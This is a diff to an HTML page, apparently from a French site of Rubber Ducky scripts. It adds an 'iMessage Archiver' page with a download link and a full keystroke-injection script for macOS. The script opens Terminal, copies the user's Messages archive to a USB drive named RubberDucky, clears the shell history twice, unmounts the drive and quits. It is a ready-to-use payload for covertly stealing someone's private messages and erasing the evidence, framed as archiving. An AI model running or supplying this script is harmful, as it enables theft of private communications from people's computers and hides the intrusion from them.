@@ -96,33 +96,64 @@
 
   <!--Main layout-->
   <main class="mt-5 pt-5">
-  </br>
     <div class="container">
-      <h1 class="h1 ducky-blue-text">Archiver ses iMessages</h1>
-      </br>
-      <div class="row">
-        <div class="col-sm">
-          <h3 class="h3 ducky-blue-text">Informations </h3>
-          </br>
-          <div>
-            <h4 class="h4 ducky-blue-text">Système(s) d'exploitation </h4>
-            <p class="ducky-blue-text">OSX</p>
-          </div>
-          <div>
-          <h4 class="h4 ducky-blue-text">Fonctionnalité </h4>
-            <p class="ducky-blue-text">Avec ce script, tu pourras extraire tes messages dans un fichier à ton nom.</p>
-          </div>
-          <div>
-            <h4 class="h4 ducky-blue-text">Déroulement du script</h4>
-            <p class="ducky-blue-text">Etape 1</p>
-            <p class="ducky-blue-text">Etape 2</p>
-            <p class="ducky-blue-text">Etape 3</p>
-          </div>
+      
+      <h3 class="ducky-blue-text pb-4">iMessage Archiver</h3>
+
+      <div>
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Système(s) d'exploitation :</h4>
+          <p class="ducky-blue-text"><i class="fab fa-apple"></i> MacOS</p>
         </div>
-        <div class="col-sm">
+
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Fonctionnalités :</h4>
+          <p class="ducky-blue-text">Extrait des messages vers un fichier au choix.</p>
+        </div>
+
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Déroulement du script :</h4>
+
+          <ol>
+            <li class="ducky-blue-text">Ouverture du terminal</li>
+            <li class="ducky-blue-text">Copie de l'archive vers un périphérique USB</li>
+            <li class="ducky-blue-text">Effacement de l'historique de commandes</li>
+          </ol>
+        </div>
+
+        <div class="text-center py-4">
           <a href="../resources/scripts/dh-imessage-archiver.txt" download>
             <button type="button" class="btn btn-primary ducky-blue rounded">Télécharger</button>
           </a>
+        </div>
+
+        <div class="py-4">
+          <h4 class="ducky-blue-text">Le script :</h4>
+
+          <pre class="line-numbers mdb-color darken-3"><code>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 3000</span>
+            <span class="new-line blue-text">GUI SPACE</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 150</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> Terminal</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 300</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> cp -r ~/Library/Messages/Archive /Volumes/RubberDucky/$USER/</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> history -c</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> diskutil umount /Volumes/RubberDucky</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 500</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> history -c</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> echo 5A13X99</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 1000</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> exit</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 250</span>
+            <span class="new-line blue-text">GUI Q</span>
+          </code></pre>
         </div>
       </div>
     </div>
